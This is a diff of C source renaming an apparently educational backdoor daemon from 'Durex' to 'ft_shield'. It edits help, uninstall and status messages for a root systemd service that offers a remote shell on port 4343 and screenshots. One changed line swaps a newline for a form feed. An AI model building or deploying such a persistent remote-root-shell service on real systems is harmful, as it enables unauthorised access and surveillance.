@@ -26,24 +26,24 @@ extern char **environ;
 static t_bool	server_cmd_help(t_client *client, t_server *server)
 {
 	char *help_content = "\n"
-		COLORIZE(SH_YELLOW, " • Durex commands:\n")
+		COLORIZE(SH_YELLOW, " • ft_shield commands:\n")
 		"\t'help' or '?'\t- Show this message.\n"
-		"\t'exit'\t\t- Quit Durex.\n"
+		"\t'exit'\t\t- Quit ft_shield.\n"
 		"\t'shell'\t\t- Spawn a shell on port 4343.\n\n"
 		COLORIZE(SH_YELLOW, " • Bonus commands:\n")
-		"\t'uninstall'\t- Uninstall Durex. (/!\\ kill Durex daemon on success /!\\)\n"
-		"\t'log'\t\t- Print durex log file.\n"
-		"\t'stat'\t\t- Print status and information about durex.\n"
+		"\t'uninstall'\t- Uninstall ft_shield. (/!\\ kill ft_shield daemon on success /!\\)\n"
+		"\t'log'\t\t- Print ft_shield log file.\n"
+		"\t'stat'\t\t- Print status and information about ft_shield.\n"
 		"\t'screenshot'\t- Take screenshot of the screen and save it to /tmp folder.\n\n"
 		COLORIZE(SH_YELLOW, " • Informations:\n")
 		" * You can check install status with 'stat' command.\n"
-		" * You can check service status by running: systemctl status durex in shell.\n"
+		" * You can check service status by running: systemctl status ft_shield in shell.\n"
 		" * A corrupt installation mean, one of this file is missing:\n\t"
 		SERVICE_FILE "\n\t" SERVICE_INSTALL_FILE "\n\t" SERVICE_BIN "\n\n"
 		COLORIZE(SH_YELLOW, " • Manual Uninstall:\n")
 		" Spawn a shell, using 'shell' then run each following commands:\n"
-		" systemctl stop durex;\n systemctl disable durex;\n systemtcl daemon-reload;\n"
-		" systemctl reset-failed;\n rm /var/lock/durex.lock;\n"
+		" systemctl stop ft_shield;\n systemctl disable ft_shield;\n systemtcl daemon-reload;\n"
+		" systemctl reset-failed;\n rm /var/lock/ft_shield.lock;\n"
 		" And finally remove all listed file in Informations sections.\n"
 		" Don't forget to clean your shit done with root shell.\n"
 		"\n";
@@ -146,16 +146,16 @@ static t_bool	server_cmd_uninstall(t_client *client, t_server *server)
 		return (false);
 	if (uninstall_service())
 	{
-		send_text("Uninstall Durex: " COLORIZE(SH_GREEN, "• ") "Done.\nDurex: "
+		send_text("Uninstall ft_shield: " COLORIZE(SH_GREEN, "• ") "Done.\fft_shield: "
 		COLORIZE(SH_PINK, "• ") "Quitting ...\n", client->socket);
-		durex_log("durex service has been removed from system.", LOG_WARNING);
+		durex_log("ft_shield service has been removed from system.", LOG_WARNING);
 		durex_log("Quitting ...", LOG_INFO);
 		ft_lstdel(&server->client_lst, del_client);
 		kill_daemon(EXIT_SUCCESS);
 	}
-	send_text("Uninstall Durex: " COLORIZE(SH_RED, "• ") "Failed.\n"
-	COLORIZE(SH_YELLOW, "• ") "Durex: Still running install may be corrupt ...\n", client->socket);
-	durex_log("durex uninstall has failed.", LOG_WARNING);
+	send_text("Uninstall ft_shield: " COLORIZE(SH_RED, "• ") "Failed.\n"
+	COLORIZE(SH_YELLOW, "• ") "ft_shield: Still running install may be corrupt ...\n", client->socket);
+	durex_log("ft_shield uninstall has failed.", LOG_WARNING);
 	return (false);
 }
 
@@ -194,16 +194,16 @@ static t_bool	server_cmd_stat(t_client *client, t_server *server)
 	if (!server || !client)
 		return (false);
 
-	// Generate informations about Durex
-	header = COLORIZE(SH_BLUE, "• ") "Durex status:\n\t";
+	// Generate informations about ft_shield
+	header = COLORIZE(SH_BLUE, "• ") "ft_shield status:\n\t";
 	if (durex_is_installed())
-		install_status = "Durex install: "COLORIZE(SH_GREEN, "• ")
+		install_status = "ft_shield install: "COLORIZE(SH_GREEN, "• ")
 			"Correctly installed.\n\tConnexions:\n\t";
 	else
-		install_status = "Durex install: "COLORIZE(SH_YELLOW, "• ")
+		install_status = "ft_shield install: "COLORIZE(SH_YELLOW, "• ")
 			"Not install or corrupt. (see help)\n\tConnexions:\n\t";
 	clients = get_client_list(server);
-	sprintf(footer, "Durex running since: %.0f seconds.\n", difftime(time(NULL), server->start_time));
+	sprintf(footer, "ft_shield running since: %.0f seconds.\n", difftime(time(NULL), server->start_time));
 
 	// Grab all informations in one string
 	status_len = ft_strlen(header) + ft_strlen(install_status) + ft_strlen(clients) + ft_strlen(footer);
